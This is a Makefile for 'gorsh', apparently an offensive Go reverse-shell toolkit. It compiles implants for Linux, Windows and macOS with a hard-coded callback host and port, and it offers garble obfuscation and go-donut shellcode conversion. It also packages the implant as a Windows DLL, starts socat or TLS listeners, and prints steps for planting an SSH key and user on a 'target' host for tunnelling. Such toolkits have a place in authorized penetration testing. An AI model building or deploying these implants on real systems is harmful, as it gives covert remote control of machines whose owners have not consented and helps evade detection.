APP = gorsh
OUT = build

SRV_KEY = certs/server.key
SRV_PEM = certs/server.pem
PKEY = internal/sshocks/conf/id_ed25519

# BUILD=garble -tiny build
BUILD=go build -trimpath -buildmode=pie

PLATFORMS=linux windows darwin
target=$(word 1, $@)

AGT_SRC =cmd/gorsh/*
SRV_SRC =cmd/gorsh-listen/*

LHOST ?= 127.0.0.1
LPORT ?= 8443

FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
LD.windows = "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
LD.linux = "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
LD.darwin = ${LD.linux}

MINGW=x86_64-w64-mingw32-gcc
CXX=x86_64-w64-mingw32-g++

GARBLE=${GOPATH}/bin/garble
GODONUT=${GOPATH}/bin/go-donut

# zStd is a highly efficient compression library that requires CGO compilation If you'd like to
# turn this feature on and have experience cross-compiling with cgo, enable the feature below for
# win/64 and linux/64 implants 
# ZSTD=-tags zstd

all: $(PLATFORMS) servers

${PLATFORMS}: $(GARBLE) $(PKEY) $(SRV_KEY)
	GOOS=${target} ${BUILD} \
		-ldflags ${LD.${target}} \
		-o ${OUT}/${APP}-${target} \
		${AGT_SRC}

listen-socat: $(SRV_KEY)
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen-socat.sh scripts/start.sh

listen: $(SRV_KEY)
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh

server:
	GOOS=linux ${BUILD} -ldflags ${LD.linux} -o ${OUT}/srv/gorsh-server ${SRV_SRC}

windll:
	@# https://stackoverflow.com/questions/40573401/building-a-dll-with-go-1-7
	@cp cmd/gorsh/main.go ${OUT}/${NAME}.go
	@sed -i '1 a import "C"' ${OUT}/${NAME}.go
	@echo '//export Run' >> ${OUT}/${NAME}.go
	@echo 'func Run() { main() }' >> ${OUT}/${NAME}.go
	cp scripts/gorsh.c ${OUT}/

	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} GOOS=windows GOARCH=amd64 \
	${BUILD} ${LINUX_LDFLAGS} ${ZSTD} -buildmode=c-archive -o ${OUT}/${NAME}.a ${OUT}/${NAME}.go
	${MINGW} -shared -pthread -o ${OUT}/${NAME}.dll ${OUT}/${NAME}.c ${OUT}/${NAME}.a -lwinmm -lntdll -lws2_32

clean:
	rm -rf ${OUT} ${PKEY}* certs/*

enumscripts:
	@echo Updating Enum Scripts
	bash scripts/prepare_enum_scripts.sh


## Dependency Management

$(GARBLE):
	go get mvdan.cc/garble

$(GODONUT):
	go get -u github.com/Binject/go-donut

$(PKEY):
	ssh-keygen -t ed25519 -f ${target} -N ''
	@echo
	@echo "================================================="
	@echo "                 IMPORTANT"
	@echo "================================================="
	@echo
	@echo "# The following creates a user with a /bin/false shell on the target ssh server."
	@echo "# And appends the following line to that user's authorized_keys file"
	@echo
	@echo "HDIR=/home/sshuser"
	@echo "useradd -s /bin/false -m -d \$${HDIR} -N sshuser"
	@echo "mkdir -p \$${HDIR}/.ssh"
	@echo "cat <<EOF >> \$${HDIR}/.ssh/authorized_keys"
	@echo "NO-X11-FORWARDING,PERMITOPEN=\"0.0.0.0:1080\" `cat ${target}.pub`"
	@echo "EOF"
	@echo
	@echo "# If you know your target's public IP, you can also prepend the above with:"
	@echo "FROM=<ip or hostname>"
	@echo


$(SRV_KEY) $(SRV_PEM) &:
	@openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}

.PHONY: $(PLATFORMS) clean listen servers listen-socat
